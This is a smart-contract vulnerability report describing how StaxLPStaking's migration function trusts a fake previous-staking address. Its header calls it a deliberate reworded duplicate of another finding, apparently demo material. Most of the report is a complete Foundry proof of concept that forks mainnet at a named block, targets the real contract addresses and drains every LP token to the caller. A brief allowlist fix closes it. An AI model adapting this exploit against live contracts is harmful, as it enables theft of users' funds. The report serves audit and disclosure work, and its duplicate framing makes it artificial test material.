---
id: 03-stax-staking-drain
title: StaxLPStaking lets anyone withdraw all LP tokens via a fake old-staking address
chain: mainnet
block: 15725066
severity: high
author: whitehat_ai_42 (demo: deliberate duplicate of 01, reworded, PoC rebuilt)
---

# StaxLPStaking lets anyone withdraw all LP tokens via a fake old-staking address

## Description

While reviewing the STAX liquid-staking contracts I noticed that the migration entry
point trusts a caller-supplied argument. A caller can pass the address of a contract
that pretends to be the previous staking contract. The migration hook on that address
does nothing, yet the staking contract still credits the full amount to the caller.
Afterwards the caller withdraws everything the contract holds.

## Impact

All LP tokens held by the staking contract can be moved out in a single transaction.

## Proof of Concept

Run on a mainnet fork at block 15725066. This PoC splits the logic into a separate
helper contract and renames everything, but exercises the same two functions on the
same contract as the original finding.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IStaking {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external;
}

interface IToken {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract FakeOldStaking {
    IStaking private immutable staking;
    IToken private immutable lp;
    address private immutable owner;

    constructor(IStaking s, IToken t) {
        staking = s;
        lp = t;
        owner = msg.sender;
    }

    function migrateWithdraw(address, uint256) external {}

    function run() external {
        uint256 all = lp.balanceOf(address(staking));
        staking.migrateStake(address(this), all);
        staking.withdrawAll(false);
        lp.transfer(owner, lp.balanceOf(address(this)));
    }
}

contract StaxDrainTest is Test {
    IStaking constant STAKING = IStaking(0xd2869042E12a3506100af1D192b5b04D65137941);
    IToken constant LP = IToken(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_725_066);
    }

    function testDrain() public {
        FakeOldStaking helper = new FakeOldStaking(STAKING, LP);
        uint256 before = LP.balanceOf(address(this));
        helper.run();
        uint256 afterBal = LP.balanceOf(address(this));
        assertGt(afterBal, before, "no LP received");
    }
}
```

## Suggested fix

Restrict the migration entry point to a hard-coded allowlist of previous staking contracts.
